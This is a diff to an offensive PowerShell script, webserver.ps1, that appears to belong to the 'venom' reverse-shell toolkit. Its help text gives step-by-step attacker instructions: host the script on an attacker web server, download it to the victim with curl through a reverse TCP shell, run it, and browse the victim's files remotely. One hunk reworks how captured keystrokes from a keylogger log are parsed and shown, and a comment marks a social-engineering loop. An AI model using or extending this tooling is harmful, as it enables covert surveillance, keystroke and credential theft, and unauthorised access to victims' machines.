@@ -16,16 +16,16 @@
    to capture Screenshots of MouseClicks [<-SPsr>] and browser enumeration [<-SEnum>]
    The follow 4 steps describes how to use webserver.ps1 on venom reverse tcp shell(s)
 
-   1Âº - Place this cmdlet in attacker apache2 webroot
+   1º - Place this cmdlet in attacker apache2 webroot
         cp webserver.ps1 /var/www/html/webserver.ps1
 
-   2Âº - Upload webserver using the reverse tcp shell prompt
+   2º - Upload webserver using the reverse tcp shell prompt
         cmd /c curl http://LHOST/webserver.ps1 -o %tmp%\webserver.ps1
 
-   3Âº - Remote execute webserver using the reverse tcp shell prompt
+   3º - Remote execute webserver using the reverse tcp shell prompt
         powershell -W 1 -File "$Env:TMP\webserver.ps1" -SForce 3 -SEnum Verbose
 
-   4Âº - In attacker PC access 'http://RHOST:8086/' (web browser) to read/browse/download files.
+   4º - In attacker PC access 'http://RHOST:8086/' (web browser) to read/browse/download files.
 
 .NOTES
    If executed with administrator privileges then this cmdlet add's
@@ -189,6 +189,7 @@ $Banner = @"
 "@;
 Clear-Host;
 Write-Host $Banner;
+
 
 If($Download -ne "False"){
 $ServerIP = $Download.split(',')[0] ## Extract server ip addr from -Download "string"
@@ -612,7 +613,11 @@ $Timer = Get-Date -Format 'HH:mm:ss'
       # Stops process and Delete files/logs
       Write-Host "Captured keystrokes"
       Write-Host "-------------------" -ForegroundColor DarkGreen
-      If(Test-Path -Path "$Env:TMP\void.log"){Get-Content -Path "$Env:TMP\void.log"};Write-Host ""
+      If(Test-Path -Path "$Env:TMP\void.log"){
+         $parsedata = Get-Content -Path "$Env:TMP\void.log"
+         $Diplaydata = $parsedata  -replace "\[ENTER\]","`r`n" -replace "</time>","</time>`r`n" -replace "\[RIGHT\]","" -replace "\[BACKSPACE\]","" -replace "\[DOWN\]","" -replace "\[LEFT\]","" -replace "\[UP\]","" -replace "\[WIN KEY\]r","" -replace "\[CTRL\]v","" -replace "\[CTRL\]c","" -replace "ALT DIREITO2","@" -replace "ALT DIREITO",""
+         Write-Host "$Diplaydata"
+      };Write-Host ""
       write-host "Stoping keylogger process (void.exe)" -ForeGroundColor DarkGreen;Start-Sleep -Seconds 1
       $IDS = Get-Process void -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id|Select -Last 1
 
@@ -709,7 +714,7 @@ $Success = $False ## Python installation status
    #>
 
    ## Loop Function (Social Engineering)
-   # Hint: $i++ increases the nÃ‚Âº of the $i counter
+   # Hint: $i++ increases the nÂº of the $i counter
    Do {
        $check = cmd /c python --version
        ## check target host python version
